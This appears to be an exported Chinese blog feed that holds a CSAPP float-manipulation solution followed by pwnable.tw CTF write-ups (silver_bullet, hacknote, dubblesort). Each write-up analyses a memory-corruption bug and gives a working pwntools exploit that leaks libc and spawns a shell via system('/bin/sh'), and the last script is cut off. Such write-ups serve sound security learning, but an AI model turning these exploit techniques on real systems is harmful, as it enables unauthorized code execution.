class="number">0</span>)  <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="built_in">exp</span>++;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><ul>
<li>如果是非规格化数，直接乘2返回</li>
<li>如果是无穷大或者NaN，返回原值</li>
<li>再判断乘2后有没有溢出，如果没有溢出就返回更改exp后的uf</li>
<li>如果有溢出就返回无穷大</li>
</ul>
<h2 id="0x12-floatFloat2Int"><a href="#0x12-floatFloat2Int" class="headerlink" title="0x12 floatFloat2Int"></a>0x12 floatFloat2Int</h2><blockquote>
<p>浮点数转整数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s = uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span> = ((uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>)<span class="number">-127</span>;</span><br><span class="line">  <span class="keyword">int</span> frac = (uf&amp;<span class="number">0x007fffff</span>)|<span class="number">0x00800000</span>;</span><br><span class="line">  <span class="keyword">if</span>(!(uf&amp;<span class="number">0x7fffffff</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">31</span>)  <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span>&lt;<span class="number">0</span>)   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">exp</span>&gt;<span class="number">23</span>)  frac&lt;&lt;=(<span class="built_in">exp</span><span class="number">-23</span>);</span><br><span class="line">  <span class="keyword">else</span>  frac &gt;&gt;= (<span class="number">23</span>-<span class="built_in">exp</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!((frac&gt;&gt;<span class="number">31</span>)^s)) <span class="keyword">return</span> frac;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(frac&gt;&gt;<span class="number">31</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> ~frac+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><ul>
<li>首先考虑特殊情况，如果是0则返回0</li>
<li>如果直接阶码部分就溢出了就返回 0x80000000</li>
<li>如果是小于0的也返回0（因为尾码的部分肯定不会大于2）</li>
<li>然后判断结果跟原来符号一样不一样</li>
<li>不一样的话，然后溢出是一种情况</li>
<li>原来是负数也是一种情况</li>
</ul>
<h2 id="0x13-floatPower2"><a href="#0x13-floatPower2" class="headerlink" title="0x13 floatPower2"></a>0x13 floatPower2</h2><blockquote>
<p>求2.0^x^</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> INF = <span class="number">0xff</span>&lt;&lt;<span class="number">23</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &lt;= <span class="number">0</span>)  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">exp</span> &gt;= <span class="number">255</span>)  <span class="keyword">return</span> INF;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><p>就直接改exp的值呗，把exp改成x+127就行，再看看是不是无穷大，是不是0就行了。</p>
<p>尾数部分全0，代表1.</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable tw silver-bullet</title>
    <url>/year/01/21/cl7iordpx003m293fhw52jrgd/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一道32位rop题，里面有个<code>off-by-one</code>的细节，这次没有注意，下次一定好好看</p>
<a id="more"></a>
<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><h3 id="power-up"><a href="#power-up" class="headerlink" title="power_up"></a>power_up</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">power_up</span><span class="params">(<span class="keyword">char</span> *dest)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You need create the bullet first !"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">12</span>) &gt; <span class="number">0x2F</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't power up any more !"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me your another description of bullet :"</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your new power is : %u\n"</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Enjoy it !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞的关键在于<code>strncat(dest, &amp;s, 48 - *((_DWORD *)dest + 12));</code>，这个函数会在拼接后在结尾再加一个<code>\x00</code>，所以就会把<code>dest+12</code>中的内容覆盖成0,因此下一次调用<code>power_up</code>仍然能够拼接，所以造成了栈溢出.</p>
<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./silver_bullet'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10103</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">puts_plt = <span class="number">0x80484A8</span></span><br><span class="line">puts_got = <span class="number">0x804afdc</span></span><br><span class="line">start = <span class="number">0x8048954</span></span><br><span class="line">payload = p32(<span class="number">0x7FFFFFFF</span>) +<span class="string">'\xff'</span>*<span class="number">3</span>+ p32(puts_plt) + p32(start) + p32(puts_got)   </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Oh ! You win !!\n'</span>)</span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr =  libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system: '</span> + hex(system_addr))</span><br><span class="line">log.success(<span class="string">'binsh: '</span> + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your description of bullet :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">47</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'b'</span>*<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Give me your another description of bullet :'</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable-tw-Hacknote</title>
    <url>/year/01/20/cl7iordpq0037293f3aiqwcd2/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>一道<code>uaf</code>和<code>double free</code>题目，跟以前做的套路不太一样。</p>
<a id="more"></a>
<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><h3 id="1-1-add函数逻辑"><a href="#1-1-add函数逻辑" class="headerlink" title="1.1 add函数逻辑"></a>1.1 add函数逻辑</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">     &#123;</span><br><span class="line">       ptr[i] = malloc(<span class="number">8</span>u);</span><br><span class="line">       <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">       &#123;</span><br><span class="line">         puts(<span class="string">"Alloca Error"</span>);</span><br><span class="line">         exit(<span class="number">-1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       *(_DWORD *)ptr[i] = sub_804862B;</span><br><span class="line">       printf(<span class="string">"Note size :"</span>);                  // size大小无限制</span><br><span class="line">       read(<span class="number">0</span>, &amp;buf, <span class="number">8</span>u);</span><br><span class="line">       size = atoi(&amp;buf);</span><br><span class="line">       v0 = ptr[i];</span><br><span class="line">       v0[<span class="number">1</span>] = malloc(size);</span><br><span class="line">       <span class="keyword">if</span> ( !*((_DWORD *)ptr[i] + <span class="number">1</span>) )</span><br><span class="line">       &#123;</span><br><span class="line">         puts(<span class="string">"Alloca Error"</span>);</span><br><span class="line">         exit(<span class="number">-1</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       printf(<span class="string">"Content :"</span>);</span><br><span class="line">       read(<span class="number">0</span>, *((void **)ptr[i] + <span class="number">1</span>), size);</span><br><span class="line">       puts(<span class="string">"Success !"</span>);</span><br><span class="line">       ++dword_804A04C;</span><br><span class="line">       <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br></pre></td></tr></table></figure>

<ul>
<li>申请8个字节的空间，把地址放在ptr[i]中</li>
<li>在前4个字节放入一个输出函数</li>
<li>申请一个<code>size</code>大小的空间，把地址放在后4字节中<br>可以把ptr看成这样一个结构体的指针数组<br>后面<code>Print</code>直接就用了这个结构题里的函数指针进行输出的<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ptr</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *func_puts;</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">&#125;*ptr;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="1-2-Delete函数逻辑"><a href="#1-2-Delete函数逻辑" class="headerlink" title="1.2 Delete函数逻辑"></a>1.2 Delete函数逻辑</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>判断要删除的id是否在范围内</li>
<li>然而删除后却并没有把已经删除的部分置为NULL</li>
</ul>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>本题的关键点是，<strong>当某一次申请的content大小也为8时，将有机会分配到之前释放过的note块。这样通过向content中写入内容相当于修改note块。由此达到目的。</strong>（反正跟我原来想的完全不同，看来以后做题还是多想题目给的本身的特点，总是用套路会束缚思维）</p>
<p><strong>system函数地址泄露：</strong> print_note的打印功能可以帮助泄露地址。例如，先add note0，大小为128，再add note1，大小为128。delete note1，note0.此时再申请add note2，大小为8. 那么note2的note块就是note0块，note2的content块就是note1块（fastbin的原则是LIFO）。此时向content2中写入puts函数地址（保持不变，还是原来的）和free@got地址，这样在调用 print note2时，就会将free函数的实际地址泄露，再根据偏移泄露system函数地址。</p>
<p><strong>system函数调用：</strong> 同理，这个操作与地址泄露相似，delete note2，add note3，也是要求content大小为8，这次将puts函数地址位置覆写成泄露的system函数地址和将要执行的指令。</p>
<p>然而改成system后，函数的参数还是自己，这样肯定不行。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]);</span><br></pre></td></tr></table></figure>

<p>为了解决这个问题，这里涉及到<a href="http://blog.csdn.net/freedom2028/article/details/7104131" target="_blank" rel="noopener">Linux连续执行多条命令时的参数截断</a></p>
<p>即，如果将<code>puts</code>函数地址覆盖为<code>system</code>地址，<code>system</code>的参数是<code>system</code>函数地址本身，这样肯定不行。但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以将<code>content</code>位置覆盖成 <code>‘;sh\0’</code>.</p>
<h2 id="0x03-EXP"><a href="#0x03-EXP" class="headerlink" title="0x03 EXP"></a>0x03 EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./hacknote')</span></span><br><span class="line">sh = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">add(<span class="number">128</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">128</span>,<span class="string">'bbb'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p32(<span class="number">0x804862b</span>)+p32(<span class="number">0x804A018</span>)</span><br><span class="line">add(<span class="number">8</span>,payload)</span><br><span class="line">prt(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">'free_addr: '</span> + hex(free_addr))</span><br><span class="line">offset = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = free_addr + offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">content = p32(system_addr) + <span class="string">';sh\0'</span></span><br><span class="line">add(<span class="number">8</span>,content)</span><br><span class="line">prt(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">"system: "</span> + hex(system_addr))</span><br><span class="line">log.success(<span class="string">"offset: "</span> + hex(offset))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>uaf</tag>
        <tag>double free</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw dubble sort题解</title>
    <url>/year/01/19/cl7iordpw003j293fpd0fwa1h/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一道基础的栈溢出，开启了pie和canary</p>
<a id="more"></a>

<h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// et1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+18h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+1Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+3Ch] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// [esp+7Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"What your name :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Hello %s,How many numbers do you what to sort :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%u"</span>, &amp;v12);</span><br><span class="line">  v3 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v13;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"Enter the %d number : "</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u"</span>, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = v12;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &gt; v5 );</span><br><span class="line">  &#125;</span><br><span class="line">  sort((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;v13, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Result :"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *(&amp;v13 + v7);</span><br><span class="line">      __printf_chk(<span class="number">1</span>, (<span class="keyword">int</span>)<span class="string">"%u "</span>);</span><br><span class="line">      ++v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &gt; v7 );</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v10 = v11 ^ v15;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != v15 )</span><br><span class="line">    sub_BA0(v6, v10);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>它要排序的数字的数量没有限制，因此可以造成栈溢出。</li>
<li><code>__printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);</code>可以泄露出栈上的内容</li>
</ul>
<p>我原来是想用<code>%s</code>来泄露canary的，但是这样就没法泄露libc了，那么怎么绕过canary呢？这里就要用到<code>scanf</code>的一个小技巧。</p>
<p>如果直接输入非法字符的话，由于程序没有对输入流进行清空，所以之后的<code>scanf</code>也都会是非法字符，也就是意味着后面的输入全部无效，但是输入<code>+</code>或者<code>-</code>时是被当成一次有效输入，由于我们仅仅输入<code>+</code>或者<code>-</code>并不能直接获得一个有效数值，所以本次<code>scanf</code>也作为无效看待，这样就能保证<code>stack guard</code>不会被修改，当进行下一次<code>scanf</code>的时候，识别到输入流不完整也会继续<code>I/o</code>中断等待输入。</p>
<h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./dubblesort'</span>)</span><br><span class="line"><span class="comment">#sh = remote('chall.pwnable.tw',10101)</span></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'number :'</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="number">28</span>*<span class="string">'a'</span></span><br><span class="line">sh.recvuntil(<span class="string">'name :'</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(payload)</span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - <span class="number">0x1ae244</span></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">log.success(<span class="string">'system_addr: '</span> + hex(system_addr))</span><br><span class="line">log.success(<span class="string">'binsh_addr: '</span> + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'sort :'</span>)</span><br><span class="line">num = <span class="number">35</span></span><br><span class="line">sh.sendline(str(num))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    write_data(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">write_data(<span 